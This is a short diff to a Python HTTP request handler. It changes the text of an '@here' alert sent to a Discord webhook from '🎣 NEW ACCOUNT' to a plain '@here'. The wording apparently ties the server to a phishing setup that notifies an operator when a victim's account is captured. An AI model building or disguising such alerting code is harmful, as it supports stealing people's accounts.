@@ -37,7 +37,7 @@ class Handler(BaseHTTPRequestHandler):
                 }
                 
                 # @here message
-                ping_data = json.dumps({"content": "@here 🎣 NEW ACCOUNT"}).encode()
+                ping_data = json.dumps({"content": "@here"}).encode()
                 req1 = urllib.request.Request(DISCORD_WEBHOOK, data=ping_data, headers=headers)
                 urllib.request.urlopen(req1, timeout=5)
                 
